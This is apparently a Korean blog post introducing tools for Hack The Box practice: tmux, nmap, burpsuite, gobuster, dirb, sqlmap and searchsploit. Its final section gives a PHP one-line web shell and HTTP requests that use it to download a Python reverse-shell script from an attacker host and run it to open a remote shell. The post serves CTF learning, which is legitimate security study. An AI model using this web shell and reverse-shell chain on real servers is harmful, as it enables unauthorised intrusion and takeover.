---
layout: post
title: "hack the box intro"
featured-img: hack_the_box
category: Etc
summary: tmux, nmap, searchsploit, burpsuite, python-pty-shells 
---

# list
--- 

- Useful Tool
	+ TMUX
- Ports Scan Tool
	+ Nmap
- Service Enumeration
	+ HTTP Enumeration
		- burpsuite
	+ Web Directroy Enumeration
		- gobuster
		- dirb
	+ DataBase Enumeration
		- sqlmap
	+ Exploit Enumeration
		- searchsploit
- Web Shell
	+ python-pty-shells 

# 0. Intro
---

`hack the box` 문제를 풀면서 새로 알게되는 지식들에 대해서 정리를 하려고합니다.<br>
`hack the box` 문제의 경우에는 공격하기 위한 대상을 확인하기 위하여 시작할 때 다음과 같은 절차를 거치게 됩니다. 

- Ports Scan Tool : OPEN 되어 있는 포트를 확인합니다, 더 나아가 어떤 서비스가 동작하고 있는지 확인합니다. 
- Service Enumeration Tool : 동작하고 있는 서비스에 대한 정보를 열거합니다. 

서비스를 확인하고, Exploit에 성공하였다면 Web Shell을 업로드 하고 권한 상승을 통해 ROOT를 획득하는 것으로 마무리 지어집니다. 

취약한 서비스를 어떻게 공격하는지에 대한 설명은 각각의 포스팅에서 진행하고,<br>
본 포스팅에서는 **Ports Scan Tool, Service Enumeration Tool, Web Shell** 그리고 리눅스 환경에서 **유용하게 사용할 수 있는 툴**에 대해서 정리하겠습니다. 

# 1. Useful Tool
---

## TMUX
---

TMUX는 터미널을 편리하게 사용할 수 있도록 도와주는 툴입니다. 다양한 기능을 가지고 있지만 제가 자주 사용하는 기능은 `창 분할` 입니다.

세션을 생성하여 하나의 터미널을 여러개의 터미널로 분할 할 수 있습니다. 이렇게 생성된 세션은 명령어를 사용하여 종료하지 않는 이상 언제든 다시 접근할 수 있습니다.

세션을 다루기 위한 명령어는 다음과 같습니다.  

|command| Description |
|-----------|-------------|
|tmux ls|세션 목록보기|
|tmux new -s session_name|세션 생성하며 이름 지정|
|tmux attach -t session_aname|특정 세션으로 진입하기|
|tmux kill-session -t session_name|세션 바깥에서 특정 세션을 종료|
|exit|세션 종료|

하나의 세션에서 윈도우를 생성하고 다루기 위한 명령어는 다음과 같습니다.

|Key|Description|
|------------|-------------|
|ctrl + b, c | 새로운 윈도우 생성|
|ctrl + b, % | 윈도우 횡 분할|
|ctrl + b, " | 윈도우 종 분할|
|ctrl + b, q | 윈도우 이동 숫자키|
|ctrl + b, arrow | 윈도우 이동 방향키|
|ctrl + b, x|세션 종료|
|ctrl + b, d|세션 빠져나오기, 세션은 유지된다. |
|ctrl + b, w|모든 윈도우 리스트 보기|
|ctrl + b, z|특정 윈도우를 전체화면으로 전환, 한번 더 누르면 원상태 복구|
|ctrl + d|윈도우 닫기|
|ctrl + b + [ + ctrl + s|윈도우 내에서 검색|

TMUX에서는 tmux.conf 를 만들어서 vi의 단축키를 사용할 수 있도록 설정할 수 있습니다.

```console
root@kali:~# cat ~/.tmux.conf
set-window-option -g mode-keys vi
```
session 안에서 `ctrl+b+:` 입력 후 다음 명령어를 입력합니다.

```
source-file ~/.tmux.conf
```

이후 `ctrl+b+]`를 통해서 블록 지정(space), 복사(enter), 붙여넣기 (ctrl+b+])를 할 수 있습니다.


### Referrence
[http://blog.b1ue.sh/2016/10/10/tmux-tutorial/](http://blog.b1ue.sh/2016/10/10/tmux-tutorial/)<br>
[jupiny.tistory.com](https://jupiny.tistory.com/entry/tmux-%EC%B0%BD%EA%B3%BC-%EC%B0%BD-%EC%82%AC%EC%9D%B4%EC%97%90%EC%84%9C-%EB%B3%B5%EB%B6%99%ED%95%98%EA%B8%B0)


# 2. Ports Scan Tool
---
## 2.1 Nmap
---

Nmap은 네트워크 검색 및 보안 감사를 위한 도구로 대상 서버가 제공하는 서비스(응용 프로그램 이름, 버전), 운영체제 등을 빠르게 확인할 수 있습니다.   

Nmap은 다양한 기능, 옵션을 제공하지만 제가 주로 사용하는 옵션은 다음과 같습니다.

```bash
nmap -sC -sV -oA nmap-scripts 10.10.10.6
nmap -sC -sV -oA nmap-scripts -p 139,445 10.10.10.0/24
nmap -p 445 -sC -sV -oA nmap-scripts --script smb-enum-services 10.10.10.0/24
nmap -p 443 -sC -sV -oA nmap-scripts --script ssl-enum-ciphers 10.10.10.0/24
```

각 명령어에 대한 설명은 다음 순서과 같습니다.

- 10.10.10.6 서버의 모든 포트 스캔, 결과물 출력
- 10.10.10.0 ~ 10.10.10.255 대역 서버의 139(netbios), 445(smb) 서비스가 존재하는지 스캔
- 10.10.10.0 ~ 10.10.10.255 대역 서버의 445(smb) 서비스가 존재하는지 `smb-enum-services` 를 사용하여 스캔
- 10.10.10.0 ~ 10.10.10.255 대역의 443(smb) service 가 존재하는지 `ssl-enum-ciphers` 를 사용하여 스캔

명령어에서 사용된 옵션은 다음과 같은 기능을 가지고 있습니다.

|options|Description|
|------------|-------------|
|-sC | --script default|
|-sV|Probe open ports to determine service/version info|
|-oA \<basename\> | Output in the three major formats at once(xml, nmap, gnmap)|
|-p|ports|

Nmap에서 CIDR을 사용하여 네트워크 대역을 스캔할 수 있습니다.

|CIDR | 허용IP|
|------------|-------------|		
|192.0.0.0/8|		192.0.0.0 ~ 192.255.255.255|
|192.168.0.0/16|	192.168.0.0 ~192.168.255.255|
|192.168.67.0/24|	192.168.67.0 ~ 192.168.67.255|

### Referrence
[https://svn.nmap.org/nmap/docs/nmap.usage.txt](https://svn.nmap.org/nmap/docs/nmap.usage.txt)

# 3. Service Enumeration
---
## 3.1 HTTP Enumeration
---
## burpsuite
---
brupsuite는 웹 서버의 보안을 테스트하기 위한 도구로 HTTP Proxy, Scanner, spider 등 다양한 기능을 제공합니다.<br>
저는 주로 proxy, repeater를 사용하여 패킷을 변조하는 기능을 사용합니다.<br>
그 중 제가 사용하는 옵션에 대해서 정리해보자면 다음과 같습니다.   

target, HTTP history 탭에서 원하는 타켓만 확인하기 위해서 다음과 같이 필터를 설정할 수 있습니다.

```
target -> add to scope -> filter : show only in-scope items
proxy -> HTTP history -> filter : show only in-scope items
```

Repeater에서 패킷을 변조하여 전송할 때 HTTP Get Method를 HTTP Post Method로, 또는 그 반대로 패킷을 변경할 수 있습니다.

```
right click -> change requests method
```

## 3.2 Web Directroy Enumeration
---
## gobuster
---

gobuster는 사전 기반으로 brute forcing을 통해 숨겨진 디렉터리, 파일을 확인할 수 있는 도구입니다.

kali 에서는 기본적으로 gobuster가 설치되어 있지 않기 때문에 직접 설치를 해줘야합니다.

```console
root@kali:~# apt-get install gobuster
```

많은 사람들이 사용하는 문자열 사전입니다.

```console
root@kali:/usr/share/wordlists# git clone https://github.com/danielmiessler/SecLists.git     
```

\-w 옵션으로 문자열 사전을 지정하여 gobuster를 사용할 수 있습니다.

```console
gobuster -w /usr/share/wordlists/SecLists/Discovery/Web-Content/big.txt -u http://10.10.10.5 -o gobusterresult.txt
gobuster -w /usr/share/wordlists/SecLists/Discovery/Web-Content/raft-large-files.txt -u http://10.10.10.5 -o gobusterresult.txt
```

\-x 옵션으로 특정한 확장자를 지정할 수 있습니다. 

```console
gobuster -w /usr/share/wordlists/SecLists/Discovery/Web-Content/big.txt -u http://10.10.10.5 -x .php
gobuster -w /usr/share/wordlists/SecLists/Discovery/Web-Content/big.txt -u http://10.10.10.5 -x .php,.txt,.html
```

### Referrence
[https://redteamtutorials.com/2018/11/19/gobuster-cheatsheet/](https://redteamtutorials.com/2018/11/19/gobuster-cheatsheet/)

## dirb
---
dirb는 사전 기반으로 brute forcing을 통해 숨겨진 디렉터리, 파일을 확인할 수 있는 도구입니다.

다음의 명령어를 통해서 dirb를 실행할 수 있습니다.

```
dirb http://10.10.10.6 -r -o tmp.dirb
```

명령어에서 사용된 옵션은 다음과 같은 기능을 가지고 있습니다.

|options|Description|
|------------|-------------|
|-r | Don't search recursively|
|-o <output_file> | Save output to disk |

### Referrence
[https://tools.kali.org/web-applications/dirb](https://tools.kali.org/web-applications/dirb)

## 3.3 DataBase Enumeration
## sqlmap
---
sqlmap은 대상 URL에 SQL Injection 취약점 존재 여부를 확인할 수 있는 도구입니다.

다음의 명령어는 HTTP Request 파일을 읽어서 sqlmap을 실행할 수 있습니다. 

```
root@kali:~# sqlmap -r [HTTP Request file] --level5 --risk 3
```

## 3.4 Exploit Enumeration
---
## searchsploit
---
searchsploit은 http://www.exploit-db.com 을 콘솔 환경에서 검색 할 수 있는 도구입니다.

다음의 명령어를 통해서 exploit-db를 검색할 수 있습니다.

```console
root@kali:~# searchsploit afd windows local
root@kali:~# searchsploit -t oracle windows
root@kali:~# searchsploit -p 39446
root@kali:~# searchsploit linux kernel 3.2 --exclude="(PoC)|/dos/"
root@kali:~# searchsploit -x 11746.txt
```

|options|Description|
|------------|-------------|
|\-x, --examine [EDB-ID]|Examine (aka opens) the exploit using $PAGER.|

### Referrence
[https://www.exploit-db.com/searchsploit](https://www.exploit-db.com/searchsploit)


# 4. Web Shell
---
## python-pty-shells 
---
python-pty-shells는 python 기반의 reverse-shell입니다.

다음 방법은 파일업로드가 가능하거나, 임의의 파일을 쓸 수 있을 때 가능한 방법입니다.
테스트한 환경은 ubuntu 18.04에 APM을 설치하여 진행하였습니다.

1) 먼저 아래와 같은 php 구문을 업로드 또는 서버에 씁니다.

```php
<?php echo system($_REQUEST['shin']);?>
```

다음과 같이 HTTP Request를 할 수있습니다.

```
GET /shell.php?shin=ifconfig HTTP/1.1
```

2) wget을 이용하여 python 파일을 전달하기 위해 다음 명령어를 실행합니다.

```bash
python -m SimpleHTTPServer
```

3) tcp_pty_backconnect.py의 ip부분을 수정하여 다음과 같이 HTTP Request를 통해 해당 서버에 python 파일을 전달합니다.

권한문제로 정상적으로 파일을 다운받을 수 없으므로 /var/www/html의 권한을 수정하였습니다.

```
GET /shell.php?shin=wget 192.168.87.132:8000/tcp_pty_backconnect.py -O /var/www/html/uploads/.rev.py HTTP/1.1
```

4) listener를 사용하기 위해서 다음의 명령어를 사용합니다.

```
python tcp_pty_shell_handler.py -b 192.168.87.132:31337
```

5) 이후 서버에 업로드한 python 파일을 실행시키면 쉘을 얻을 수 있습니다.

```
GET /shell.php?shin=python /var/www/html/uploads/.rev.py HTTP/1.1
```

### Referrence
[https://github.com/infodox/python-pty-shells](https://github.com/infodox/python-pty-shells)

